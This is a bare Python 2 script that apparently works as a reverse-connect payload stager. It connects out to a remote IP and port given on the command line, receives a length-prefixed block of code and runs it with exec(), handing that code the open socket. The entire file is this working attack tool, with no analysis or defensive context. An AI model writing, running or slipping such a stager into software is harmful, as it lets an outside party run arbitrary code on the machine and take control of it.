#!/usr/bin/env python
#
import sys,socket,struct,time
if len(sys.argv) < 3:
    print "Usage: [remote ip] [port]"
    sys.exit(0)

address = sys.argv[1]
port = sys.argv[2]
print("connecting to %s:%s", address, port)
for i in range(10):
    try:
        s=socket.socket(2,socket.SOCK_STREAM)
        s.connect((str(address),int(port)))
        print "connected"
        time.sleep(2)
        break
    except:
        print "connection failed"
        time.sleep(1)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
    d+=s.recv(l-len(d))
exec(d,{'s':s})
